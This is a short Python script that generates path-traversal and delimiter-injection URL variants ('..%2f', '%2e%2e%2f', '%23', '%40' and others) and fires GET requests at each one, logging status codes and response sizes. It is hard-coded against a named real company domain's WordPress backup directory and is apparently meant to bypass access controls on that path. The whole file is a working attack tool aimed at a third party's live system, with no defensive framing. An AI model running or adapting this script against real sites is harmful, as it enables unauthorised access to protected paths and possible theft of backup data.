import requests
from urllib.parse import urlparse


def payloadGen(url):
    u = urlparse(url)

    prefix = u.scheme + '://' + u.netloc + '/'
    suffix = ''
    if u.query != '':
        suffix = '?' + u.query

    path= u.path[1:]
    # %23 (#), %3f (?), %26 (&), %2e (.), %2f (/), %40 (@)
    payload = ['.%2f','..%2f','%23','%3f','%26','%2e%2e%2f','%2e%2f','%40','cyan/..%2f','cyan/cyan1/..%2f..%2f','../','./']

    payload_list = []

    if '*' in path:
        for p in payload:
            payload_list.append(prefix + path.replace("*",p) + suffix)

        return payload_list

    payload_list.append(prefix + path + '%3f' + suffix)
    payload_list.append(prefix + path + '%23' + suffix)
    payload_list.append(prefix + path + '%40' + suffix)

    path = path.split("/")
    for p in payload:
        i = 0
        for router in path:
            t = path[i]
            path[i] = p + router
            # print('/'.join(path))
            payload_list.append(prefix + '/'.join(path) + suffix)
            path[i] = t
            i+=1
    return payload_list


def sendReq(url):
    try:
        resp = requests.get(url, timeout=3)
    except Exception as e:
        print(url,e.__class__.__name__)
        return
    
    print(url,resp.status_code,len(resp.text))




url = "https://nextgvideo.huawei.com/wp-content/ai1wm-backups/?id=1&q=2"

p = payloadGen(url)

for i in p:
    sendReq(i)